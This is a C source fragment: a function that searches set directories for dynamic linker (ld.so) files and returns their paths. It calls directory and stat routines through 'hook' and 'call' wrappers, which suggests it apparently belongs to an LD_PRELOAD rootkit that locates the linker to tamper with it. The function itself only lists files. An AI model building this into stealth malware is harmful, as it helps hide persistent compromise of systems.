// searches all ldhomes directories for ld.so & returns an array of char pointers to each valid ld.so.
// the pointer allf is updated with the number of located ld.so.
char **ldfind(int *allf){
    char *home, *ldname, *namedup, *nametok;
    int found=0, isanld=0;
    struct dirent *dir;
    DIR *dp;
    struct stat sbuf;

    char **foundlds = malloc(sizeof(char*)*MAXLDS);
    if(!foundlds) return NULL;

    hook(COPENDIR, CREADDIR, C__LXSTAT);

    for(int i=0; i<sizeofarr(ldhomes) && found<MAXLDS; i++){
        home = ldhomes[i];
        
        dp = call(COPENDIR, home);
        if(dp == NULL) continue;

        while((dir = call(CREADDIR, dp)) != NULL && found<MAXLDS){
            if(!strncmp(".", dir->d_name, 1) || strncmp("ld-", dir->d_name, 3))
                continue;

            ldname = dir->d_name;
            namedup = strdup(ldname);
            nametok = strtok(namedup, ".");
            while(nametok != NULL){
                if(!strcmp("so\0", nametok)){
                    isanld = 1;
                    break;
                }
                nametok = strtok(NULL, ".");
            }
            free(namedup);

            if(!isanld)
                continue;
            else isanld = 0;

            char path[strlen(home)+strlen(ldname)+2];
            snprintf(path, sizeof(path), "%s/%s", home, ldname);

            memset(&sbuf, 0, sizeof(struct stat));
            if((long)call(C__LXSTAT, _STAT_VER, path, &sbuf) < 0 || S_ISLNK(sbuf.st_mode))
                continue;

            foundlds[found] = malloc(PATH_MAX+1);
            strncpy(foundlds[found++], path, PATH_MAX);
        }

        closedir(dp);
    }

    *allf = found;
    return foundlds;
}